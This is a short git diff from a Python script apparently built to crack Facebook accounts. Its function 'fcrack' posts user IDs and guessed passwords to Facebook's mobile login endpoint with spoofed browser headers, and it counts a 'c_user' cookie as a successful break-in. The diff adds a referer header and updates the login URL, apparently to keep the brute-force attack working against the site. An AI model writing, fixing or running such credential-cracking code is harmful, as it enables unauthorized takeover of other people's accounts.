@@ -831,7 +831,7 @@ def fcrack(uid,pwx,tl):
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
             'accept-encoding': 'gzip, deflate, br',
             'accept-language': 'en-US,en;q=0.9',
-            
+            'referer': 'https://mobile.facebook.com/?zero_e=3&zero_et=1672940463&_rdc=1&_rdr',
             'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
             'sec-ch-ua-mobile': '?0',
             'sec-ch-ua-platform': '"Windows"',
@@ -840,7 +840,7 @@ def fcrack(uid,pwx,tl):
             'sec-fetch-site': 'same-origin',
             'upgrade-insecure-requests': '1',
             'user-agent': ua}
-			lo = session.post('https://mobile.facebook.com/?zero_e=3&zero_et=1672940463&_rdc=1&_rdr&tbua=1',data=log_data,headers=header_freefb).text
+			lo = session.post('https://mobile.facebook.com/?zero_e=3&zero_et=1672943084&_rdc=2&_rdr&tbua=1',data=log_data,headers=header_freefb).text
 			log_cookies=session.cookies.get_dict().keys()
 			#print(iid+'|'+pws+'|'+str(log_cookies))
 			if 'c_user' in log_cookies:
